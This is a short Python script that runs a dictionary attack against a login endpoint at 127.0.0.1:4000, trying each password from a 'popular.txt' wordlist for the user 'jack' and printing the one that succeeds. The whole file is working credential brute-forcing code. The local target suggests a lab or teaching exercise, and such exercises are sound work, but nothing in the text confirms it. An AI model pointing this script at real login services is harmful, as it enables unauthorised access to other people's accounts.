import requests

with open('popular.txt') as f:
    passwords = f.read().split('\n')

for password in passwords:
    response = requests.post('http://127.0.0.1:4000/auth',
                             json={'login': 'jack', 'password': password})
    if response.status_code == 200:
        print('SUCCESS', password)
        break
